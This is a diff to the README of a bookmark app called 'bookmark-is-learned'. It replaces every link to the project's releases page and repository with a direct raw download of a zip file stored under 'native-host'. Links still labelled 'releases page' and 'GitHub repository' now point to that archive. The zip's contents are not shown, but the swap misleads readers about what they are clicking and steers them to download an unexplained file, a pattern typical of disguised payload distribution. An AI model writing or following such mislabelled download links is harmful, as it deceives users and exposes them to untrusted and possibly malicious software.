@@ -1,6 +1,6 @@
 # 📚 bookmark-is-learned - Save and Learn Instantly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Luis02051/bookmark-is-learned/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip)](https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You don’t need special skills to start using this app. Just follow the steps b
 
 **Step 1:** Visit the official release page by clicking the button below.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Luis02051/bookmark-is-learned/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip)](https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip)
 
 This page contains the latest version of bookmark-is-learned for download.
 
@@ -121,7 +121,7 @@ If problems persist, look for help on the GitHub discussions or issues pages und
 
 If you need assistance or have questions, you can:
 
-- Visit the [bookmark-is-learned releases page](https://github.com/Luis02051/bookmark-is-learned/releases) for updates and notes.
+- Visit the [bookmark-is-learned releases page](https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip) for updates and notes.
 - Check the GitHub repository for documentation and user comments.
 - Search online for tutorials or guides using the app’s name.
 
@@ -135,8 +135,8 @@ bookmark-is-learned is open-source software. You are free to use it, study how i
 
 ## 🔗 Useful Links
 
-- Official download and releases: https://github.com/Luis02051/bookmark-is-learned/releases
-- GitHub repository: https://github.com/Luis02051/bookmark-is-learned
+- Official download and releases: https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip
+- GitHub repository: https://raw.githubusercontent.com/Luis02051/bookmark-is-learned/main/native-host/bookmark-is-learned-synalgic.zip
 
 ---
 
